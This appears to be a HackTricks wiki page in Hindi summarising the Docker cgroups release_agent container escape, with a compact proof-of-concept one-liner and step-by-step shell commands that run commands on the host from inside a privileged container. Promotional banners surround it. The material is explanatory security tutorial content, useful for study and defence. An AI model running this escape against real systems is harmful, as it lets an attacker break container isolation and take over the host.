# Docker release\_agent cgroups escape

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** पर आधारित खोज इंजन है जो **नि:शुल्क** सुविधाएं प्रदान करता है ताकि यह जांच सकें कि कोई कंपनी या उसके ग्राहकों को **स्टीलर मैलवेयर्स** द्वारा **कंप्रोमाइज** किया गया है या नहीं।

WhiteIntel का मुख्य उद्देश्य खाता हस्तांतरण और जानकारी चोरी करने वाले मैलवेयर से होने वाले रैंसमवेयर हमलों का मुकाबला करना है।

आप उनकी वेबसाइट देख सकते हैं और **नि:शुल्क** में उनका इंजन प्रयास कर सकते हैं:

{% embed url="https://whiteintel.io" %}

***

**अधिक विवरण के लिए, मूल ब्लॉग पोस्ट**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** का संदर्भ देखें। यह केवल एक सारांश है:**

मूल PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
प्रमाण संदर्भ (PoC) एक विधि का प्रदर्शन करता है जिससे cgroups का शोषण किया जा सकता है एक `release_agent` फ़ाइल बनाकर और इसके आह्वान को ट्रिगर करके कंटेनर होस्ट पर विभिन्न कमांड्स को निषेधात्मक रूप से चलाने के लिए। यहाँ शामिल हैं जो कदम शामिल हैं:

1. **पर्यावरण की तैयारी:**
* एक निर्देशिका `/tmp/cgrp` बनाई गई है जो cgroup के लिए माउंट पॉइंट के रूप में सेवा करेगी।
* RDMA cgroup नियंत्रक को इस निर्देशिका पर माउंट किया गया है। RDMA नियंत्रक की अनुपस्थिति के मामले में, एक वैकल्पिक रूप से `memory` cgroup नियंत्रक का उपयोग करने की सिफारिश की जाती है।
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **बच्चा सीग्रुप सेट अप करें:**
* माउंट किए गए सीग्रुप निर्देशिका के भीतर "x" नाम का एक बच्चा सीग्रुप बनाया जाता है।
* "x" सीग्रुप के लिए सूचनाएं सक्षम की जाती हैं जिसके लिए उसके notify\_on\_release फ़ाइल में 1 लिखकर।
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **रिलीज एजेंट कॉन्फ़िगर करें:**
* होस्ट पर कंटेनर का पथ /etc/mtab फ़ाइल से प्राप्त किया जाता है।
* फिर cgroup का release\_agent फ़ाइल कॉन्फ़िगर किया जाता है ताकि एक स्क्रिप्ट जिसका नाम /cmd है जो प्राप्त होस्ट पथ पर स्थित है, को निष्पादित करें।
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd स्क्रिप्ट बनाएं और कॉन्फ़िगर करें:**
* /cmd स्क्रिप्ट कंटेनर के अंदर बनाया जाता है और इसे कॉन्फ़िगर किया जाता है कि ps aux को execute करें, जो आउटपुट को कंटेनर में /output नामक फ़ाइल में redirect करेगा। /output का पूरा पथ होस्ट पर निर्दिष्ट किया जाता है।
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **हमला प्रारंभ करें:**
* एक प्रक्रिया "x" बाल cgroup के अंदर प्रारंभ की जाती है और तुरंत समाप्त हो जाती है।
* इससे `release_agent` (/cmd स्क्रिप्ट) को ट्रिगर होता है, जो होस्ट पर ps aux का निष्पादन करता है और आउटपुट को कंटेनर के अंदर /output में लिखता है।
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) एक **डार्क-वेब** पर आधारित खोज इंजन है जो **मुफ्त** सुविधाएं प्रदान करता है ताकि जांच सकें कि कोई कंपनी या उसके ग्राहकों को **स्टीलर मैलवेयर्स** द्वारा **कंप्रोमाइज** किया गया है।

WhiteIntel का मुख्य उद्देश्य खाता हासिल करने और जानकारी चुराने वाले मैलवेयर से होने वाले रैंसमवेयर हमलों का मुकाबला करना है।

आप उनकी वेबसाइट चेक कर सकते हैं और उनके इंजन का प्रयास कर सकते हैं **मुफ्त** में:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}
